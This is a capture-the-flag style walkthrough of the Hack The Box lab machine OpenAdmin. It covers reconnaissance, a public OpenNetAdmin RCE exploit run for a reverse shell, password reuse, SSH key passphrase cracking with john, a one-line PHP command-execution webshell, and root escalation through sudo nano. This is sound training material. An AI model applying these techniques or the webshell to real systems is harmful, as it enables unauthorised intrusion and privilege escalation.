---
title: "[Writeup] Hack The Box: OpenAdmin"
date: 2020-04-29T23:39:12+07:00
categories: [writeup]
tags: [writeup, walkthrough, htb, hackthebox]
---

Let's pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.

{{< img src="/images/htb_openadmin/infocard.png">}}

<!--more-->

**OS:** Linux  
**Difficulty:** Easy  
**Points:** 20  
**Release:** 04 Jan 2020  
**IP:** 10.10.10.171  
**Date Cleared:** 20 Apr 2020


**[สำหรับ Writeup ภาษาไทย กดที่ Link นี้ได้เลยครับ](/writeup/htb_openadmin_th/)**

## Information Gathering

Starting with `nmap` as usual, we can see that there are two open ports, `ssh` on 22, and `http` on `80`.

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

On port `80`, there is an Apache2 Default Page on the home page.

{{< img src="/images/htb_openadmin/80_home.png">}}

Using `gobuster`, several interesting paths were found.

{{< img src="/images/htb_openadmin/80_gobuster.png">}}

After accessing them one by one, we can see that they are just static template webpages with placeholder text.

{{< img src="/images/htb_openadmin/80_artwork.png">}}

{{< img src="/images/htb_openadmin/80_sierra.png">}}

{{< img src="/images/htb_openadmin/80_music.png">}}

However, on the music page, the Login button links to <http://10.10.10.171/ona>. The page is hosting `OpenNetAdmin 18.1.1`.

{{< img src="/images/htb_openadmin/80_ona.png">}}

Using Google search, we can see that the version is vulnerable to RCE.

{{< img src="/images/htb_openadmin/ona_rce.png">}}

## Exploitation

I downloaded an exploit script from <https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py> and run it with the command `python3 ona-rce.py exploit http://10.10.10.171/ona/` to get a reverse shell.

{{< img src="/images/htb_openadmin/80_ona_rev.png">}}

Digging through the files, I found an interesting config file containing db password `n1nj4W4rri0R!`.

{{< img src="/images/htb_openadmin/dbsetting.png">}}

Looking at the home directory, we can see two users, `jimmy` and `joanna`. I was able to login with the user `jimmy` using the password found.

{{< img src="/images/htb_openadmin/user.png">}}

At this point, I just used `ssh` to connect to the server and dig further.

I then found an interesting path, `/var/www/internal`, owned by `jimmy`.

{{< img src="/images/htb_openadmin/internal.png">}}

The `index.php` page contains a login form. The username must be `jimmy`, and the `sha512` hash of the password must match.

{{< img src="/images/htb_openadmin/internal_index.png">}}

The `main.php` page prints out the private key of `joanna`.

{{< img src="/images/htb_openadmin/internal_main.png">}}

Now can roughly guess the steps we need to take. Find the correct password, log in, get the private key, and use the key to login as `joanna`.

Starting from the password, I used <https://crackstation.net/> to crack the hash, and found that the password is `Revealed`.

{{< img src="/images/htb_openadmin/internal_index_crack.png">}}

To log in, we need to know the port that these pages are hosted on. Knowing that the web server is `apache`, we can find the configuration files in `/etc/apache2/`. I found that the `/var/www/internal` path is hosted on port `52846`.

{{< img src="/images/htb_openadmin/internal_apache.png">}}

Remember the `nmap` result? Yes, the port `52846` is not open from the outside, so we can only access it internally from the target machine using `curl`.

**However, there's a twist!** Let's look at the source code of `main.php` again.

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

The private key would be printed whether we are logged in or not! We would just be redirected to `index.php` if we are not logged in. Therefore, we can just curl `main.php` to get the private key, no username or password needed.

{{< img src="/images/htb_openadmin/internal_curlpriv.png">}}

So, what if we want to access the internal website from a web browser on our machine? `Local Port Forwarding` is the answer.

The command to do `Local Port Forwarding` is `ssh -L local_port:destination_ip:destination_port username@ssh_server_ip`.

As we already know the credential of `jimmy` (username), we can use `ssh` to forward the connection from a port on our machine, such as `80` (local_port), through the ssh server on `10.10.10.171` (ssh_server_ip), to the destination host at `127.0.0.1` (destination_ip) on port `52846` (destination_port). This means that the ssh server host would forward the connection to itself, allowing us to connect to a locally hosted web server.

The command is `ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171`.

{{< img src="/images/htb_openadmin/internal_localforward.png">}}

With the port forwarding done. we can now use the web browser to connect to port `80` on our machine to reach the web server.

{{< img src="/images/htb_openadmin/internal_localhost.png">}}

Logging in with `jimmy:Revealed`.

{{< img src="/images/htb_openadmin/internal_login.png">}}

As planned, we now have the private key of `joanna`.

{{< img src="/images/htb_openadmin/internal_privkey.png">}}

I copied the private key into a file name `privkey`. We can use the key to `ssh` to the target with the user `joanna` using the command `ssh -i privkey joanna@10.10.10.171` ... or not?

The private key is protected with a passphrase!

{{< img src="/images/htb_openadmin/joanna_pass.png">}}

But what is the passphrase? Let's try cracking it using `john` and our beloved wordlist, `rockyou.txt`.

We can convert the private key into the format usable by `john` with the command `python /usr/share/jogn/ssh2john.py privkey > privkey.hash`, then crack it using the command `john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt`.

And the result? Success!

{{< img src="/images/htb_openadmin/internal_privkey_crack.png">}}

We can *finally* `ssh` to the target using the private key and the passphrase `bloodninjas`.

{{< img src="/images/htb_openadmin/joanna_ssh.png">}}

### Another Solution

There's another method to access `joanna`. If we go back, we can see that `jimmy` own the `/var/www/internal` directory and all the files inside, so we can edit the existing files, or write new files there.

{{< img src="/images/htb_openadmin/internal.png">}}

We can create a simple command execution webshell named `cmd.php` in the directory using `echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php`. Then we can `curl` to the page with our command in `cmd` parameter using `curl localhost:52846/cmd.php?cmd=[COMMAND]` to run arbitrary commands as `joanna`.

{{< img src="/images/htb_openadmin/internal_joannacmd.png">}}

We can use this method to get the private key, or put our public key inside `/home/joanna/.ssh/authorized_keys` to gain access to the machine.

## Privilege Escalation

The escalation steps for this box is quite straightforward. Using `sudo -l`, we can see that `nano` can be run as `root` without password needed.

{{< img src="/images/htb_openadmin/joanna_nano.png">}}

With the information from <https://gtfobins.github.io/gtfobins/nano/>, it's clear that `sudo` with `nano` is a `nono`, allowing a low-privilege user to escalate to `root` easily.

{{< img src="/images/htb_openadmin/gtfobins.png">}}

Running `nano` with elevated permission.

{{< img src="/images/htb_openadmin/priv1.png">}}

Pressing `Ctrl-R`, then `Ctrl-X` to execute command.

{{< img src="/images/htb_openadmin/priv2.png">}}

Type `reset; sh 1>&0 2>&0`, then press `Enter`.

{{< img src="/images/htb_openadmin/priv3.png">}}

Tap `Enter` a few times to clear the screen, and here we go, rooted!

{{< img src="/images/htb_openadmin/root.png">}}
